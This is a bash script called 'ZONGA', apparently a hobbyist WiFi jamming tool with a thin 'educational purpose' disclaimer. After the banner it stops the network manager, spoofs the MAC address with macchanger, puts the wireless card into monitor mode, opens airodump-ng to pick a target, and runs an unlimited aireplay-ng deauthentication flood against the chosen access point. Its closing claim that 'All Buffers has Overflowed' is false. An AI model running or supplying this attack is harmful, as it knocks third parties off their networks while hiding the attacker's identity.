#!/bin/bash

clear

#Setting up font configuration
tput bold &&tput setaf 4

#Big text

echo "                             ________  _   _  ____    _    "
echo "                            |__  / _ \| \ | |/ ___|  / \   "
sleep .2
echo "                              / / | | |  \| | |  _  / _ \  "
sleep .2
echo "                             / /| |_| | |\  | |_| |/ ___ \ "
sleep .2
echo "                            /____\___/|_| \_|\____/_/   \_\ "
echo

sleep .3
echo "                               $(tput setaf 2)Written By: Anonymous"
echo 
sleep .1
echo "                                  $(tput setaf 1)***DISCLAIMER***"
echo
sleep .2
echo "   This tool is made only for educational purpose.The user of this tools will be resp-"

sleep .1
echo "   onsible in  doing  illegle activity. Anonymous  will  not  be responsible for this."

echo
sleep 1
read -p "                          Do you accept the agreement?(Y/N): " A
if [ $A == "Y" ] || [ $A == "y" ]; then
	echo
	echo -ne "      Loading Components: [*                    ] (1%)\r" 
        echo -ne "      Loading Components: [**                   ] (2%)\r"
        echo -ne "      Loading Components: [***                  ] (3%)\r"
        sleep 1
        echo -ne "      Loading Components: [***************      ] (87%)\r"
        sleep 1
        echo -ne "      Loading Components: [*********************] (100%)$(tput setaf 2)Completed!\r"
	sleep 1	
	echo
	clear
	tput setaf 4
	echo "                             ________  _   _  ____    _    "
	echo "                            |__  / _ \| \ | |/ ___|  / \   "
	echo "                              / / | | |  \| | |  _  / _ \  "
	echo "                             / /| |_| | |\  | |_| |/ ___ \ "
	echo "                            /____\___/|_| \_|\____/_/   \_\ "
	echo
	echo
	echo "$(tput setaf 3)Chose your interface from the opend window like wlan0,wlan1,etc"
	echo 
	gnome-terminal -e "bash -c 'ifconfig;exec $SHELL'" > /dev/null
	
	read -p "$(tput setaf 4)Enter Interface(wlan0,wlan,etc): " int
	echo 
	OM="$(ip -o link show dev $int | grep -Po 'ether \K[^ ]*')"
	if [ -z $OM ]; then
		OM="$(ip -o link show dev $int | grep -Po 'radiotap \K[^ ]*')"
	fi
	echo -ne "$(tput setaf 3)Changing MAC Address.\r"
	#STOPPING NETWORK MANAGER
	service network-manager stop  > /dev/null
	
	#CHANGING MAC ADDRESS AND TURNING ON MONITER MODE
	ifconfig $int down  > /dev/null
  	macchanger -r $int > /dev/null
	sleep 1
	echo -ne "Changing MAC Address..\r"
	sleep 2
	echo -ne "Changing MAC Address...$(tput setaf 2)Changed!\r"
	tput setaf 4 
	CM="$(ip -o link show dev $int | grep -Po 'ether \K[^ ]*')"
	if [ -z $CM ]; then
		CM="$(ip -o link show dev $int | grep -Po 'radiotap \K[^ ]*')"	
	fi	
	echo
	echo 
	echo "$(tput setaf 1)Orignal MAC: $OM "
	echo
	echo "Fake MAC: $CM"
	echo 
	sleep 1
	echo -ne "$(tput setaf 3)Turning on moniter mode.\r" 
	sleep 1
	ifconfig $int down > /dev/null
	echo -ne "Turning on moniter mode..\r"	
	sleep 1
	iwconfig $int mode moniter > /dev/null
	ifconfig $int up > /dev/null
	echo -ne "Turning on moniter mode...$(tput setaf 2)State:ON\r"
	tput setaf 4
 
	
	#STOPPING NETWORK MANAGER
	service network-manager restart > /dev/null

	echo
	echo -en "$(tput setaf 3)Getting ready for Jamming WIFI. \r"
	sleep 1
	echo -en "Getting ready for Jamming WIFI.. \r"
	sleep 1
	echo -en "Getting ready for Jamming WIFI...$(tput setaf 2)Ready \r"
	tput setaf 4
	sleep 1
	clear
	echo "                             ________  _   _  ____    _    "
	echo "                            |__  / _ \| \ | |/ ___|  / \   "
	echo "                              / / | | |  \| | |  _  / _ \  "
	echo "                             / /| |_| | |\  | |_| |/ ___ \ "
	echo "                            /____\___/|_| \_|\____/_/   \_\ "
	echo
	echo
	echo "$(tput setaf 1)Choose Target and note his MAC and chennal number"
	gnome-terminal -e "bash -c 'airodump-ng $int;bash;exec $SHELL'" > /dev/null
	echo
	echo
	read -p "$(tput setaf 3)Enter Target's MAC Address: " TM
	read -p "Target's Chennal Number: " cn
	sleep 3
	echo 
	echo
	echo "$(tput setaf 1)To Stop attack, Close the running terminal!"
	echo
	echo -en "$(tput setaf 3)Wait, We are Gathring Power to destroy our target.\r"
	sleep 1
	echo -en "Wait, We are Gathring Power to destroy our target..\r"
	sleep 4
	echo -en "Wait, We are Gathring Power to destroy our target...\r"
	sleep 8
	echo -en "Wait, We are Gathring Power to destroy our target.....\r"	
	iwconfig $int channel $cn > /dev/null
	gnome-terminal -e "bash -c 'aireplay-ng -0 0 -a $TM $int;exec $SHELL'" > /dev/null
	echo 
	echo -en " We are having grip on his WIFI. \r"
	sleep 1
	echo -en "We are having grip on his WIFI...\r"
	sleep 5
	echo -en "We are having grip on his WIFI......\r"
	sleep 4
	echo -en "We are having grip on his WIFI........\r"
	sleep 9
	echo -en "We are having grip on his WIFI..............\r"
	sleep 15	
	echo 
	echo "$(tput setaf 1)Congratulation!"
	echo "All Buffers has Overflowed!"
fi



